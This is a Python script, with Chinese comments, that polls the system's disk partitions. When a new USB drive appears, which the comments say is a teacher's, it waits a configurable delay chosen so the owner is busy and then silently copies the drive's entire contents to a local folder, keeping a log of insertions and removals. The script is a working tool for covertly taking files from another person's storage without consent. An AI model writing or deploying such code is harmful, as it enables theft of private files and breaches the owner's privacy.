import psutil,shutil,os,time

#读取配置文件
dir=os.getcwd()
from Setting import read_json
auto_start,save_dir,wait_time=read_json()
wait_time=int(wait_time)
if save_dir=='':
    os.mkdir('file')
    save_dir=dir+r'\files'
os.chdir(save_dir)

#获取分区名
def getname(copydir):
    print(dir)
    ml='dir '+copydir+' ->temp.txt'
    os.system(ml)
    with open('temp.txt','r') as f:
        name=f.readlines()[0].split('是 ')[1].split('\n')[0]
    os.remove('temp.txt')
    try:
        os.chdir(dir)
    except:
        pass
    return name

#获取磁盘信息
old_disk=psutil.disk_partitions()

#日志模块
class log:
    def start():
        sen='[开始运行]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+'\n'
        with open('log.txt','a') as f:
            f.write(sen)
    def New_Usb(name,save_dir):
        sen0='[插入]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+': 有U盘插入'
        sen1='分区名: '+name+' 存放路径'+save_dir+'\n'
        sen=[]
        sen.append(sen0)
        sen.append(sen1)
        with open('log.txt','a') as f:
            f.writelines(sen)
    def exit():
        sen='[拔出]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+': U盘拔出\n'
        with open('log.txt','a') as f:
            f.write(sen)

log.start()

#循环检测是否老师插入U盘
while True:
    new_disk=psutil.disk_partitions()
    print('当前分区数',len(new_disk))
    if len(new_disk)>len(old_disk): #当前分区数变大时，就是老师插入U盘的时候
        for i in old_disk:
            new_disk.remove(i)
        print('开始复制...')
        copy_dir=str(new_disk[0][0])
        name=getname(copy_dir)
        save_dir=save_dir+'\\'+name
        log.New_Usb(name=name,save_dir=save_dir)
        time.sleep(wait_time) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
        print('复制目录: ',copy_dir)
        print('存放目录: ',save_dir)
        try:
            shutil.copytree(copy_dir,save_dir,dirs_exist_ok=True)
        except shutil.Error:
            pass
        old_disk=psutil.disk_partitions()
    elif len(new_disk)<len(old_disk): #当前分区数变小时，就是老师拔出U盘的时候
        old_disk=psutil.disk_partitions()
        print('waiting...')
        log.exit()
        time.sleep(wait_time)
    else:
        print('waiting...')
        time.sleep(wait_time)